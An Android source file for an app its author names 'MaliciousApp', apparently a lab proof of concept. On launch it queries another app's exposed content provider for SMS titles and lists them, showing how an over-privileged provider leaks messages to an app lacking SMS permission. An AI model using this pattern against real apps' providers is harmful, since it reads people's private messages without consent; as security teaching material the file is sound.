package over.privilege.maliciousapp;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import java.util.ArrayList;
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ListView smsListView = findViewById(R.id.smsListView);
        ArrayList<String> smsTitles = new ArrayList<>();

        Uri smsTitlesUri = Uri.parse("content://over.privilege.reflection.smstitlesprovider");

        try {
            Cursor cursor = getContentResolver().query(smsTitlesUri, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int titleIndex = cursor.getColumnIndexOrThrow("title");
                do {
                    smsTitles.add(cursor.getString(titleIndex));
                } while (cursor.moveToNext());
                cursor.close();
            }

            ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, smsTitles);
            smsListView.setAdapter(adapter);
        } catch (Exception e) {
            Log.e("MaliciousApp", "Erreur lors de l'accès au Content Provider", e);
        }
    }
}